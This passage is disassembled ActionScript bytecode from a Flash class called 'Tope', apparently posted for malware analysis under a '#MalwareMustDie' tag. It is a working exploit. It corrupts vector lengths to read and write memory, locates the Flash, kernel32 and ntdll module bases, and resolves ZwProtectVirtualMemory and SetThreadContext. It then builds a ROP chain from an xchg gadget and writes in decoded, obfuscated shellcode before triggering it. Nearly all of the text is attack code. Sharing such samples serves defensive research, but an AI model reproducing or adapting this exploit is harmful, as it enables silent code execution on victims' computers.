       121  pushbyte      	0
       123  setlocal      	28
       125  pushbyte      	0
       127  convert_u     	
       128  setlocal      	30
       130  pushbyte      	0
       132  convert_u     	
       133  setlocal      	31
       135  pushbyte      	0
       137  convert_u     	
       138  setlocal      	32
       140  pushbyte      	0
       142  convert_u     	
       143  setlocal      	33
       145  pushbyte      	0
       147  setlocal      	37
       149  pushnull      	
       150  coerce        	flash.utils::ByteArray //nameIndex = 8
       152  setlocal      	38
       154  pushbyte      	0
       156  convert_u     	
       157  setlocal      	39
       159  pushbyte      	0
       161  convert_u     	
       162  setlocal      	40
       164  pushundefined 	
       165  coerce_a      	
       166  setlocal      	41
       168  pushbyte      	0
       170  convert_u     	
       171  setlocal      	42
       173  pushundefined 	
       174  coerce_a      	
       175  setlocal      	43
       177  getlocal1     	
       178  coerce_a      	
       179  setlocal      	24
       181  pushbyte      	0
       183  setlocal      	29
       185  pushint       	404238336	// 0x18183000
       187  coerce_a      	
       188  setlocal      	34
       190  pushshort     	4064
       193  coerce_a      	
       194  setlocal      	35
       196  pushint       	65536	// 0x10000
       198  coerce_a      	
       199  setlocal      	36
       201  pushint       	404238344	// 0x18183008
       203  convert_u     	
       204  setlocal      	12
       206  getlocal0     	
       207  getproperty   	private::found //nameIndex = 26
       209  convert_b     	
       210  dup           	
       211  iffalse       	L1

       215  pop           	
       216  getlocal0     	
       217  getproperty   	m_status //nameIndex = 29
       219  pushint       	65535	// 0xffff
       221  equals        	
       
       L1: 
       222  iffalse       	L2

       226  getlocal0     	
       227  getproperty   	private::work //nameIndex = 21
       229  callpropvoid  	stop (0) //nameIndex = 102
       232  returnvoid    	
       
       L2: 
       233  getlocal0     	
       234  getproperty   	m_status //nameIndex = 29
       236  pushbyte      	0
       238  ifne          	L3

       242  pushbyte      	0
       244  setlocal      	25
       246  jump          	L4

       
       L5: 
       250  label         	
       251  getlocal0     	
       252  getproperty   	s //nameIndex = 23
       254  getlocal      	25
       256  getproperty   	null //nameIndex = 75
       258  getlex        	Vector //nameIndex = 82
       260  getlex        	uint //nameIndex = 3
       262  applytype     	(1)
       264  astypelate    	
       265  getproperty   	length //nameIndex = 76
       267  getlocal0     	
       268  getproperty   	m_rawLen //nameIndex = 44
       270  ifngt         	L6

       274  jump          	L7
       
       L6: 
       278  jump          	L8

       282  getlocal0     	
       283  pushscope     	
       284  newcatch      	0
       286  dup           	
       287  setlocal      	44
       289  dup           	
       290  pushscope     	
       291  swap          	
       292  setslot       	1
       294  popscope      	
       295  kill          	44
       
       L8: 
       297  getlocal      	25
       299  pushbyte      	1
       301  add           	
       302  convert_i     	
       303  setlocal      	25
       
       L4: 
       305  getlocal      	25
       307  getlocal0     	
       308  getproperty   	m_suf //nameIndex = 45
       310  iflt          	L5
       
       L7: 
       314  getlocal      	25
       316  getlocal0     	
       317  getproperty   	m_suf //nameIndex = 45
       319  ifne          	L9

       323  returnvoid    	
       
       L9: 
       324  pushbyte      	1
       326  setlocal      	26
       328  pushbyte      	-1
       330  setlocal      	28
       332  getlocal0     	
       333  getproperty   	s //nameIndex = 23
       335  getlocal      	25
       337  getproperty   	null //nameIndex = 75
       339  pushshort     	4096
       342  getlocal      	26
       344  multiply      	
       345  pushbyte      	4
       347  divide        	
       348  pushbyte      	2
       350  subtract      	
       351  pushint       	1073741808	// 0x3ffffff0
       353  setproperty   	null //nameIndex = 75
       355  pushbyte      	0
       357  setlocal      	37
       359  jump          	L10

       
       L11: 
       363  label         	
       364  getlocal0     	
       365  getproperty   	s //nameIndex = 23
       367  getlocal      	37
       369  getproperty   	null //nameIndex = 75
       371  getproperty   	length //nameIndex = 103
       373  pushint       	1073741808	// 0x3ffffff0
       375  ifne          	L12

       379  getlocal      	37
       381  convert_i     	
       382  setlocal      	28
       384  getlocal      	12
       386  pushshort     	4096
       389  add           	
       390  convert_u     	
       391  setlocal      	12
       393  jump          	L13
       
       L12: 
       397  inclocal_i    	37
       
       L10: 
       399  getlocal      	37
       401  getlocal0     	
       402  getproperty   	s //nameIndex = 23
       404  getproperty   	length //nameIndex = 76
       406  iflt          	L11
       
       L13: 
       410  getlocal      	28
       412  pushbyte      	-1
       414  ifne          	L14

       418  returnvoid    	
       
       L14: 
       419  getlocal0     	
       420  getlocal      	12
       422  setproperty   	private::m_longArrBase //nameIndex = 30
       424  getlocal0     	
       425  getlocal      	28
       427  setproperty   	private::m_longArrIdx //nameIndex = 31
       429  getlocal0     	
       430  getlocal      	34
       432  getlocal0     	
       433  getproperty   	m_rawLen //nameIndex = 44
       435  callpropvoid  	private::write32 (2) //nameIndex = 54
       438  getlocal0     	
       439  dup           	
       440  setlocal      	44
       442  getproperty   	m_status //nameIndex = 29
       444  increment     	
       445  setlocal      	45
       447  getlocal      	44
       449  getlocal      	45
       451  setproperty   	m_status //nameIndex = 29
       453  kill          	45
       455  kill          	44
       
       L3: 
       457  getlocal0     	
       458  getproperty   	m_status //nameIndex = 29
       460  pushbyte      	1
       462  ifne          	L15

       466  getlocal0     	
       467  getproperty   	private::m_longArrBase //nameIndex = 30
       469  pushshort     	4088
       472  add           	
       473  pushshort     	4096
       476  add           	
       477  convert_u     	
       478  setlocal      	9
       480  pushbyte      	0
       482  setlocal      	25
       484  jump          	L16

       
       L17: 
       488  label         	
       489  getlocal      	9
       491  getlocal      	25
       493  pushshort     	4096
       496  multiply      	
       497  add           	
       498  pushint       	65536	// 0x10000
       500  modulo        	
       501  pushbyte      	0
       503  equals        	
       504  dup           	
       505  iffalse       	L18

       509  pop           	
       510  getlocal0     	
       511  getlocal      	9
       513  getlocal      	25
       515  pushshort     	4096
       518  multiply      	
       519  add           	
       520  callproperty  	private::read32 (1) //nameIndex = 53
       523  getlocal0     	
       524  getproperty   	m_rawLen //nameIndex = 44
       526  equals        	
       527  not           	
       
       L18: 
       528  dup           	
       529  iffalse       	L19

       533  pop           	
       534  getlocal0     	
       535  getlocal      	9
       537  getlocal      	25
       539  pushshort     	4096
       542  multiply      	
       543  add           	
       544  pushbyte      	4
       546  add           	
       547  callproperty  	private::read32 (1) //nameIndex = 53
       550  getlocal      	35
       552  equals        	
       553  not           	
       
       L19: 
       554  iffalse       	L20

       558  getlocal      	9
       560  pushint       	65536	// 0x10000
       562  add           	
       563  convert_u     	
       564  setlocal      	9
       566  getlocal      	25
       568  pushbyte      	0
       570  ifeq          	L21

       574  getlocal      	25
       576  decrement     	
       577  convert_i     	
       578  setlocal      	25
       
       L21: 
       580  jump          	L22
       
       L20: 
       584  getlocal0     	
       585  getlocal      	9
       587  getlocal      	25
       589  pushshort     	4096
       592  multiply      	
       593  add           	
       594  pushbyte      	4
       596  add           	
       597  callproperty  	private::read32 (1) //nameIndex = 53
       600  getlocal      	35
       602  equals        	
       603  dup           	
       604  iffalse       	L23

       608  pop           	
       609  getlocal0     	
       610  getlocal      	9
       612  getlocal      	25
       614  pushshort     	4096
       617  multiply      	
       618  add           	
       619  pushbyte      	4
       621  pushbyte      	17
       623  multiply      	
       624  add           	
       625  callproperty  	private::read32 (1) //nameIndex = 53
       628  pushbyte      	0
       630  greaterthan   	
       
       L23: 
       631  dup           	
       632  iffalse       	L24

       636  pop           	
       637  getlocal0     	
       638  getlocal      	9
       640  getlocal      	25
       642  pushshort     	4096
       645  multiply      	
       646  add           	
       647  pushbyte      	4
       649  pushbyte      	17
       651  multiply      	
       652  add           	
       653  callproperty  	private::read32 (1) //nameIndex = 53
       656  getlocal0     	
       657  getlocal      	9
       659  getlocal      	25
       661  pushshort     	4096
       664  multiply      	
       665  add           	
       666  pushbyte      	4
       668  pushbyte      	100
       670  multiply      	
       671  add           	
       672  callproperty  	private::read32 (1) //nameIndex = 53
       675  equals        	
       
       L24: 
       676  iffalse       	L22

       680  getlocal0     	
       681  getlocal      	9
       683  getlocal      	25
       685  pushshort     	4096
       688  multiply      	
       689  add           	
       690  pushbyte      	4
       692  pushbyte      	17
       694  multiply      	
       695  add           	
       696  callproperty  	private::read32 (1) //nameIndex = 53
       699  convert_u     	
       700  setlocal      	9
       702  jump          	L25
       
       L22: 
       706  jump          	L26

       710  getlocal0     	
       711  pushscope     	
       712  newcatch      	1
       714  dup           	
       715  setlocal      	44
       717  dup           	
       718  pushscope     	
       719  swap          	
       720  setslot       	1
       722  popscope      	
       723  kill          	44
       
       L26: 
       725  getlocal      	25
       727  pushbyte      	1
       729  add           	
       730  convert_i     	
       731  setlocal      	25
       
       L16: 
       733  getlocal      	25
       735  getlocal      	36
       737  iflt          	L17
       
       L25: 
       741  getlocal      	25
       743  getlocal      	36
       745  ifne          	L27

       749  returnvoid    	
       
       L27: 
       750  getlocal      	9
       752  pushdouble    	4294967292
       754  bitand        	
       755  convert_u     	
       756  dup           	
       757  setlocal      	9
       759  convert_u     	
       760  setlocal      	16
       762  getlocal0     	
       763  getlocal      	16
       765  setproperty   	private::m_flashVirtual //nameIndex = 33
       767  getlocal0     	
       768  getlocal0     	
       769  getlocal      	9
       771  callproperty  	private::read32 (1) //nameIndex = 53
       774  pushdouble    	4294901760
       776  bitand        	
       777  callproperty  	private::getModuleBase (1) //nameIndex = 62
       780  convert_u     	
       781  dup           	
       782  setlocal      	17
       784  pushbyte      	0
       786  ifne          	L28

       790  getlex        	flash.external::ExternalInterface //nameIndex = 77
       792  pushstring    	"errorRepro"
       794  pushstring    	"can't search the module base!"
       796  callpropvoid  	call (2) //nameIndex = 78
       799  returnvoid    	
       
       L28: 
       800  getlocal0     	
       801  getlocal      	17
       803  setproperty   	private::m_flashBase //nameIndex = 32
       805  getlocal0     	
       806  dup           	
       807  setlocal      	44
       809  getproperty   	m_status //nameIndex = 29
       811  increment     	
       812  setlocal      	45
       814  getlocal      	44
       816  getlocal      	45
       818  setproperty   	m_status //nameIndex = 29
       820  kill          	45
       822  kill          	44
       
       L15: 
       824  getlocal0     	
       825  getproperty   	m_status //nameIndex = 29
       827  pushbyte      	2
       829  ifne          	L29

       833  getlocal0     	
       834  getlocal0     	
       835  getproperty   	private::m_flashBase //nameIndex = 32
       837  pushstring    	"KERNEL32"
       839  pushbyte      	0
       841  callproperty  	private::getModuleBaseFromIAT (3) //nameIndex = 63
       844  convert_u     	
       845  dup           	
       846  setlocal      	4
       848  pushbyte      	0
       850  ifne          	L30

       854  returnvoid    	
       
       L30: 
       855  getlocal0     	
       856  getlocal      	4
       858  setproperty   	private::m_kernel32Base //nameIndex = 34
       860  getlocal0     	
       861  dup           	
       862  setlocal      	44
       864  getproperty   	m_status //nameIndex = 29
       866  increment     	
       867  setlocal      	45
       869  getlocal      	44
       871  getlocal      	45
       873  setproperty   	m_status //nameIndex = 29
       875  kill          	45
       877  kill          	44
       
       L29: 
       879  getlocal0     	
       880  getproperty   	m_status //nameIndex = 29
       882  pushbyte      	3
       884  ifne          	L31

       888  getlocal0     	
       889  getlocal0     	
       890  getproperty   	private::m_kernel32Base //nameIndex = 34
       892  pushstring    	"ntdll"
       895  pushbyte      	0
       897  callproperty  	private::getModuleBaseFromIAT (3) //nameIndex = 63
       900  convert_u     	
       901  setlocal3     	
       902  getlocal3     	
       903  pushbyte      	0
       905  ifne          	L32

       909  returnvoid    	
       
       L32: 
       910  getlocal0     	
       911  getlocal3     	
       912  setproperty   	private::m_ntdllBase //nameIndex = 35
       914  getlocal0     	
       915  dup           	
       916  setlocal      	44
       918  getproperty   	m_status //nameIndex = 29
       920  increment     	
       921  setlocal      	45
       923  getlocal      	44
       925  getlocal      	45
       927  setproperty   	m_status //nameIndex = 29
       929  kill          	45
       931  kill          	44
       
       L31: 
       933  getlocal0     	
       934  getproperty   	m_status //nameIndex = 29
       936  pushbyte      	4
       938  ifne          	L33

       942  getlocal0     	
       943  getlocal0     	
       944  getproperty   	private::m_ntdllBase //nameIndex = 35
       946  pushstring    	"ZwProtectVirtualMemory"
       949  callproperty  	private::getProcAddr (2) //nameIndex = 64
       952  convert_u     	
       953  dup           	
       954  setlocal      	10
       956  pushbyte      	0
       958  ifne          	L34

       962  returnvoid    	
       
       L34: 
       963  getlocal0     	
       964  getlocal      	10
       966  setproperty   	private::m_ZwProtectAddr //nameIndex = 36
       968  getlocal0     	
       969  dup           	
       970  setlocal      	44
       972  getproperty   	m_status //nameIndex = 29
       974  increment     	
       975  setlocal      	45
       977  getlocal      	44
       979  getlocal      	45
       981  setproperty   	m_status //nameIndex = 29
       983  kill          	45
       985  kill          	44
       
       L33: 
       987  getlocal0     	
       988  getproperty   	m_status //nameIndex = 29
       990  pushbyte      	5
       992  ifne          	L35

       996  getlocal0     	
       997  getlocal0     	
       998  getproperty   	private::m_ntdllBase //nameIndex = 35
       1000 pushbyte      	60
       1002 add           	
       1003 callproperty  	private::read32 (1) //nameIndex = 53
       1006 convert_u     	
       1007 setlocal      	13
       1009 getlocal0     	
       1010 getlocal0     	
       1011 getproperty   	private::m_ntdllBase //nameIndex = 35
       1013 getlocal      	13
       1015 add           	
       1016 pushshort     	264
       1019 add           	
       1020 callproperty  	private::read32 (1) //nameIndex = 53
       1023 convert_u     	
       1024 setlocal      	14
       1026 getlocal0     	
       1027 getlocal0     	
       1028 getproperty   	private::m_ntdllBase //nameIndex = 35
       1030 getlocal      	13
       1032 add           	
       1033 pushshort     	260
       1036 add           	
       1037 callproperty  	private::read32 (1) //nameIndex = 53
       1040 convert_u     	
       1041 setlocal      	13
       1043 getlocal0     	
       1044 getproperty   	private::m_ntdllBase //nameIndex = 35
       1046 getlocal      	13
       1048 add           	
       1049 convert_u     	
       1050 setlocal      	13
       1052 getlocal0     	
       1053 getproperty   	private::m_ntdllBase //nameIndex = 35
       1055 getlocal      	14
       1057 add           	
       1058 convert_u     	
       1059 setlocal      	14
       1061 findpropstrict	flash.utils::ByteArray //nameIndex = 8
       1063 constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       1066 coerce        	flash.utils::ByteArray //nameIndex = 8
       1068 dup           	
       1069 setlocal      	38
       1071 getlex        	flash.utils::Endian //nameIndex = 91
       1073 getproperty   	LITTLE_ENDIAN //nameIndex = 92
       1075 setproperty   	endian //nameIndex = 93
       1077 getlocal      	38
       1079 pushint       	50068	// 0xc394
       1081 callpropvoid  	writeShort (1) //nameIndex = 96
       1084 getlocal0     	
       1085 getlocal      	38
       1087 getlocal      	13
       1089 getlocal      	14
       1091 callproperty  	private::searchBytes (3) //nameIndex = 65
       1094 convert_u     	
       1095 dup           	
       1096 setlocal      	15
       1098 pushbyte      	0
       1100 ifne          	L36

       1104 returnvoid    	
       
       L36: 
       1105 getlocal0     	
       1106 getlocal      	15
       1108 setproperty   	private::m_xchgInstAddr //nameIndex = 37
       1110 getlocal0     	
       1111 dup           	
       1112 setlocal      	44
       1114 getproperty   	m_status //nameIndex = 29
       1116 increment     	
       1117 setlocal      	45
       1119 getlocal      	44
       1121 getlocal      	45
       1123 setproperty   	m_status //nameIndex = 29
       1125 kill          	45
       1127 kill          	44
       
       L35: 
       1129 getlocal0     	
       1130 getproperty   	m_status //nameIndex = 29
       1132 pushbyte      	6
       1134 ifne          	L37

       1138 getlocal0     	
       1139 getlocal0     	
       1140 getlocal0     	
       1141 getproperty   	private::m_kernel32Base //nameIndex = 34
       1143 pushstring    	"SetThreadContext"
       1146 callproperty  	private::getProcAddr (2) //nameIndex = 64
       1149 setproperty   	private::m_SetThreadContext //nameIndex = 38
       1151 getlocal0     	
       1152 getproperty   	private::m_SetThreadContext //nameIndex = 38
       1154 pushbyte      	0
       1156 ifne          	L38

       1160 pushbyte      	0
       1162 convert_u     	
       1163 setlocal      	40
       1165 getlocal0     	
       1166 getproperty   	private::m_kernel32Base //nameIndex = 34
       1168 convert_u     	
       1169 setlocal      	39
       1171 pushbyte      	0
       1173 convert_u     	
       1174 setlocal      	40
       1176 jump          	L39

       
       L40: 
       1180 label         	
       1181 getlocal0     	
       1182 getlocal0     	
       1183 getlocal      	39
       1185 pushstring    	"KERNEL32"
       1187 getlocal      	40
       1189 callproperty  	private::getModuleBaseFromIAT (3) //nameIndex = 63
       1192 setproperty   	private::m_kernel32Base //nameIndex = 34
       1194 getlocal0     	
       1195 getproperty   	private::m_kernel32Base //nameIndex = 34
       1197 pushbyte      	0
       1199 ifne          	L41

       1203 jump          	L42
       
       L41: 
       1207 getlocal0     	
       1208 getlocal0     	
       1209 getlocal0     	
       1210 getproperty   	private::m_kernel32Base //nameIndex = 34
       1212 pushstring    	"SetThreadContext"
       1215 callproperty  	private::getProcAddr (2) //nameIndex = 64
       1218 setproperty   	private::m_SetThreadContext //nameIndex = 38
       1220 getlocal0     	
       1221 getproperty   	private::m_SetThreadContext //nameIndex = 38
       1223 pushbyte      	0
       1225 ifeq          	L42

       1229 jump          	L43
       
       L42: 
       1233 getlocal      	40
       1235 increment     	
       1236 convert_u     	
       1237 setlocal      	40
       
       L39: 
       1239 getlocal      	40
       1241 pushbyte      	100
       1243 iflt          	L40
       
       L43: 
       1247 getlocal0     	
       1248 getproperty   	private::m_SetThreadContext //nameIndex = 38
       1250 pushbyte      	0
       1252 ifne          	L38

       1256 returnvoid    	
       
       L38: 
       1257 getlocal0     	
       1258 dup           	
       1259 setlocal      	44
       1261 getproperty   	m_status //nameIndex = 29
       1263 increment     	
       1264 setlocal      	45
       1266 getlocal      	44
       1268 getlocal      	45
       1270 setproperty   	m_status //nameIndex = 29
       1272 kill          	45
       1274 kill          	44
       
       L37: 
       1276 getlocal0     	
       1277 getproperty   	m_status //nameIndex = 29
       1279 pushbyte      	7
       1281 ifne          	L44

       1285 getlocal0     	
       1286 getproperty   	private::m_flashVirtual //nameIndex = 33
       1288 convert_u     	
       1289 setlocal      	9
       1291 getlocal0     	
       1292 getlocal      	9
       1294 callproperty  	private::read32 (1) //nameIndex = 53
       1297 convert_u     	
       1298 setlocal      	7
       1300 getlocal0     	
       1301 getproperty   	private::m_longArrBase //nameIndex = 30
       1303 pushshort     	248
       1306 add           	
       1307 convert_u     	
       1308 setlocal      	6
       1310 getlocal0     	
       1311 getproperty   	private::m_longArrBase //nameIndex = 30
       1313 convert_u     	
       1314 setlocal      	12
       1316 getlocal0     	
       1317 getproperty   	private::m_ZwProtectAddr //nameIndex = 36
       1319 convert_u     	
       1320 setlocal      	10
       1322 getlocal      	6
       1324 coerce_a      	
       1325 setlocal      	41
       1327 getlocal0     	
       1328 getproperty   	s //nameIndex = 23
       1330 getlocal      	28
       1332 getproperty   	null //nameIndex = 75
       1334 getlocal      	6
       1336 getlocal      	12
       1338 subtract      	
       1339 pushbyte      	4
       1341 divide        	
       1342 pushbyte      	2
       1344 subtract      	
       1345 pushbyte      	4
       1347 subtract      	
       1348 getlocal      	41
       1350 pushdouble    	4294963200
       1352 bitand        	
       1353 setproperty   	null //nameIndex = 75
       1355 getlocal0     	
       1356 getproperty   	s //nameIndex = 23
       1358 getlocal      	28
       1360 getproperty   	null //nameIndex = 75
       1362 getlocal      	6
       1364 getlocal      	12
       1366 subtract      	
       1367 pushbyte      	4
       1369 divide        	
       1370 decrement     	
       1371 pushbyte      	4
       1373 subtract      	
       1374 pushshort     	12288
       1377 setproperty   	null //nameIndex = 75
       1379 getlocal0     	
       1380 getproperty   	s //nameIndex = 23
       1382 getlocal      	28
       1384 getproperty   	null //nameIndex = 75
       1386 getlocal      	6
       1388 getlocal      	12
       1390 subtract      	
       1391 pushbyte      	4
       1393 divide        	
       1394 getlocal      	10
       1396 setproperty   	null //nameIndex = 75
       1398 getlocal0     	
       1399 getproperty   	s //nameIndex = 23
       1401 getlocal      	28
       1403 getproperty   	null //nameIndex = 75
       1405 getlocal      	6
       1407 getlocal      	12
       1409 subtract      	
       1410 pushbyte      	4
       1412 divide        	
       1413 pushbyte      	1
       1415 add           	
       1416 getlocal      	41
       1418 pushbyte      	28
       1420 add           	
       1421 setproperty   	null //nameIndex = 75
       1423 getlocal0     	
       1424 getproperty   	s //nameIndex = 23
       1426 getlocal      	28
       1428 getproperty   	null //nameIndex = 75
       1430 getlocal      	6
       1432 getlocal      	12
       1434 subtract      	
       1435 pushbyte      	4
       1437 divide        	
       1438 pushbyte      	2
       1440 add           	
       1441 pushdouble    	4294967295
       1443 setproperty   	null //nameIndex = 75
       1445 getlocal0     	
       1446 getproperty   	s //nameIndex = 23
       1448 getlocal      	28
       1450 getproperty   	null //nameIndex = 75
       1452 getlocal      	6
       1454 getlocal      	12
       1456 subtract      	
       1457 pushbyte      	4
       1459 divide        	
       1460 pushbyte      	3
       1462 add           	
       1463 getlocal      	6
       1465 pushbyte      	24
       1467 subtract      	
       1468 setproperty   	null //nameIndex = 75
       1470 getlocal0     	
       1471 getproperty   	s //nameIndex = 23
       1473 getlocal      	28
       1475 getproperty   	null //nameIndex = 75
       1477 getlocal      	6
       1479 getlocal      	12
       1481 subtract      	
       1482 pushbyte      	4
       1484 divide        	
       1485 pushbyte      	4
       1487 add           	
       1488 getlocal      	6
       1490 pushbyte      	20
       1492 subtract      	
       1493 setproperty   	null //nameIndex = 75
       1495 getlocal0     	
       1496 getproperty   	s //nameIndex = 23
       1498 getlocal      	28
       1500 getproperty   	null //nameIndex = 75
       1502 getlocal      	6
       1504 getlocal      	12
       1506 subtract      	
       1507 pushbyte      	4
       1509 divide        	
       1510 pushbyte      	5
       1512 add           	
       1513 pushbyte      	64
       1515 setproperty   	null //nameIndex = 75
       1517 getlocal0     	
       1518 getproperty   	s //nameIndex = 23
       1520 getlocal      	28
       1522 getproperty   	null //nameIndex = 75
       1524 getlocal      	6
       1526 getlocal      	12
       1528 subtract      	
       1529 pushbyte      	4
       1531 divide        	
       1532 pushbyte      	6
       1534 add           	
       1535 getlocal      	6
       1537 pushbyte      	28
       1539 subtract      	
       1540 setproperty   	null //nameIndex = 75
       1542 getlocal0     	
       1543 getproperty   	s //nameIndex = 23
       1545 getlocal      	28
       1547 getproperty   	null //nameIndex = 75
       1549 getlocal      	41
       1551 getlocal      	12
       1553 subtract      	
       1554 pushbyte      	4
       1556 divide        	
       1557 pushbyte      	7
       1559 add           	
       1560 pushint       	402664841	// 0x18002d89
       1562 setproperty   	null //nameIndex = 75
       1564 getlocal0     	
       1565 getproperty   	s //nameIndex = 23
       1567 getlocal      	28
       1569 getproperty   	null //nameIndex = 75
       1571 getlocal      	41
       1573 getlocal      	12
       1575 subtract      	
       1576 pushbyte      	4
       1578 divide        	
       1579 pushbyte      	8
       1581 add           	
       1582 pushdouble    	3096451096
       1584 setproperty   	null //nameIndex = 75
       1586 getlocal0     	
       1587 getproperty   	s //nameIndex = 23
       1589 getlocal      	28
       1591 getproperty   	null //nameIndex = 75
       1593 getlocal      	41
       1595 getlocal      	12
       1597 subtract      	
       1598 pushbyte      	4
       1600 divide        	
       1601 pushbyte      	9
       1603 add           	
       1604 getlocal      	9
       1606 setproperty   	null //nameIndex = 75
       1608 getlocal0     	
       1609 getproperty   	s //nameIndex = 23
       1611 getlocal      	28
       1613 getproperty   	null //nameIndex = 75
       1615 getlocal      	41
       1617 getlocal      	12
       1619 subtract      	
       1620 pushbyte      	4
       1622 divide        	
       1623 pushbyte      	10
       1625 add           	
       1626 pushint       	13078672	// 0xc79090
       1628 setproperty   	null //nameIndex = 75
       1630 getlocal0     	
       1631 getproperty   	s //nameIndex = 23
       1633 getlocal      	28
       1635 getproperty   	null //nameIndex = 75
       1637 getlocal      	41
       1639 getlocal      	12
       1641 subtract      	
       1642 pushbyte      	4
       1644 divide        	
       1645 pushbyte      	11
       1647 add           	
       1648 getlocal      	7
       1650 setproperty   	null //nameIndex = 75
       1652 getlocal0     	
       1653 getproperty   	s //nameIndex = 23
       1655 getlocal      	28
       1657 getproperty   	null //nameIndex = 75
       1659 getlocal      	41
       1661 getlocal      	12
       1663 subtract      	
       1664 pushbyte      	4
       1666 divide        	
       1667 pushbyte      	12
       1669 add           	
       1670 pushdouble    	3096481936
       1672 setproperty   	null //nameIndex = 75
       1674 getlocal0     	
       1675 getproperty   	s //nameIndex = 23
       1677 getlocal      	28
       1679 getproperty   	null //nameIndex = 75
       1681 getlocal      	41
       1683 getlocal      	12
       1685 subtract      	
       1686 pushbyte      	4
       1688 divide        	
       1689 pushbyte      	13
       1691 add           	
       1692 getlocal0     	
       1693 getproperty   	private::m_longArrBase //nameIndex = 30
       1695 pushbyte      	8
       1697 subtract      	
       1698 setproperty   	null //nameIndex = 75
       1700 getlocal0     	
       1701 getproperty   	s //nameIndex = 23
       1703 getlocal      	28
       1705 getproperty   	null //nameIndex = 75
       1707 getlocal      	41
       1709 getlocal      	12
       1711 subtract      	
       1712 pushbyte      	4
       1714 divide        	
       1715 pushbyte      	14
       1717 add           	
       1718 pushint       	13078672	// 0xc79090
       1720 setproperty   	null //nameIndex = 75
       1722 getlocal0     	
       1723 getproperty   	s //nameIndex = 23
       1725 getlocal      	28
       1727 getproperty   	null //nameIndex = 75
       1729 getlocal      	41
       1731 getlocal      	12
       1733 subtract      	
       1734 pushbyte      	4
       1736 divide        	
       1737 pushbyte      	15
       1739 add           	
       1740 getlocal0     	
       1741 getproperty   	m_rawLen //nameIndex = 44
       1743 setproperty   	null //nameIndex = 75
       1745 getlocal0     	
       1746 getproperty   	s //nameIndex = 23
       1748 getlocal      	28
       1750 getproperty   	null //nameIndex = 75
       1752 getlocal      	41
       1754 getlocal      	12
       1756 subtract      	
       1757 pushbyte      	4
       1759 divide        	
       1760 pushbyte      	16
       1762 add           	
       1763 pushdouble    	3968066955
       1765 setproperty   	null //nameIndex = 75
       1767 getlocal0     	
       1768 getproperty   	s //nameIndex = 23
       1770 getlocal      	28
       1772 getproperty   	null //nameIndex = 75
       1774 getlocal      	41
       1776 getlocal      	12
       1778 subtract      	
       1779 pushbyte      	4
       1781 divide        	
       1782 pushbyte      	17
       1784 add           	
       1785 pushint       	753635372	// 0x2ceb902c
       1787 setproperty   	null //nameIndex = 75
       1789 getlocal0     	
       1790 getproperty   	s //nameIndex = 23
       1792 getlocal      	28
       1794 getproperty   	null //nameIndex = 75
       1796 getlocal      	41
       1798 getlocal      	12
       1800 subtract      	
       1801 pushbyte      	4
       1803 divide        	
       1804 pushbyte      	17
       1806 add           	
       1807 pushint       	753635372	// 0x2ceb902c
       1809 setproperty   	null //nameIndex = 75
       1811 getlocal0     	
       1812 getproperty   	s //nameIndex = 23
       1814 getlocal      	28
       1816 getproperty   	null //nameIndex = 75
       1818 getlocal      	6
       1820 getlocal      	12
       1822 subtract      	
       1823 pushbyte      	4
       1825 divide        	
       1826 pushbyte      	28
       1828 add           	
       1829 getlocal0     	
       1830 getproperty   	private::m_xchgInstAddr //nameIndex = 37
       1832 setproperty   	null //nameIndex = 75
       1834 pushbyte      	29
       1836 convert_u     	
       1837 setlocal      	42
       1839 findpropstrict	flash.utils::ByteArray //nameIndex = 8
       1841 constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       1844 coerce_a      	
       1845 dup           	
       1846 setlocal      	43
       1848 getlex        	flash.utils::Endian //nameIndex = 91
       1850 getproperty   	LITTLE_ENDIAN //nameIndex = 92
       1852 setproperty   	endian //nameIndex = 100
       1854 getlocal      	43
       1856 getlocal0     	
       1857 pushstring    	"630ed5495eaad7cd8b52d42b60f0757f103583276a31f7cbee2201fd80f167"
       1860 callproperty  	private::decode (1) //nameIndex = 51
       1863 callpropvoid  	writeBytes (1) //nameIndex = 104
       1866 getlocal      	43
       1868 getlocal0     	
       1869 getproperty   	private::m_SetThreadContext //nameIndex = 38
       1871 callpropvoid  	writeInt (1) //nameIndex = 105
       1874 getlocal      	43
       1876 getlocal0     	
       1877 pushstring    	"cb5fb86dbbafd70ad04504"
       1880 callproperty  	private::decode (1) //nameIndex = 51
       1883 callpropvoid  	writeBytes (1) //nameIndex = 104
       1886 getlocal      	43
       1888 getlocal0     	
       1889 getlocal0     	
       1890 getproperty   	private::m_dump7 //nameIndex = 18
       1892 callproperty  	private::decode (1) //nameIndex = 51
       1895 callpropvoid  	writeBytes (1) //nameIndex = 104
       1898 getlocal0     	
       1899 getlocal      	41
       1901 getlocal      	42
       1903 pushbyte      	4
       1905 multiply      	
       1906 add           	
       1907 getlocal      	43
       1909 callpropvoid  	private::writeBytes (2) //nameIndex = 58
       1912 getlocal0     	
       1913 getlocal      	9
       1915 getlocal      	6
       1917 callpropvoid  	private::write32 (2) //nameIndex = 54
       1920 getlocal0     	
       1921 getproperty   	private::snd //nameIndex = 16
       1923 callpropvoid  	toString (0) //nameIndex = 85
       1926 getlocal0     	
       1927 pushint       	65535	// 0xffff
       1929 setproperty   	m_status //nameIndex = 29
       1931 getlocal0     	
       1932 callpropvoid  	free (0) //nameIndex = 49
       
       L44: 
       1935 returnvoid    	
     }

     static function Tope$cinit():*	/* disp_id=0 method_id=0 nameIndex = 0 */
     {
       // local_count=1 max_scope=1 max_stack=1 code_len=3
       // method position=5305 code position=5710
       0    getlocal0     	
       1    pushscope     	
       2    returnvoid    	
     }
   }

   function script0$init():*	/* disp_id=0 method_id=24 nameIndex = 0 */
   {
     // local_count=1 max_scope=7 max_stack=2 code_len=35
     // method position=5433 code position=11447
     0      getlocal0     	
     1      pushscope     	
     2      getscopeobject	0
     4      getlex        	Object //nameIndex = 13
     6      pushscope     	
     7      getlex        	flash.events::EventDispatcher //nameIndex = 106
     9      pushscope     	
     10     getlex        	flash.display::DisplayObject //nameIndex = 107
     12     pushscope     	
     13     getlex        	flash.display::InteractiveObject //nameIndex = 108
     15     pushscope     	
     16     getlex        	flash.display::DisplayObjectContainer //nameIndex = 109
     18     pushscope     	
     19     getlex        	flash.display::Sprite //nameIndex = 11
     21     pushscope     	
     22     getlex        	flash.display::Sprite //nameIndex = 11
     24     newclass      	Tope
     26     popscope      	
     27     popscope      	
     28     popscope      	
     29     popscope      	
     30     popscope      	
     31     popscope      	
     32     initproperty  	Tope //nameIndex = 10
     34     returnvoid    	
   }

----
#MalwareMustDie
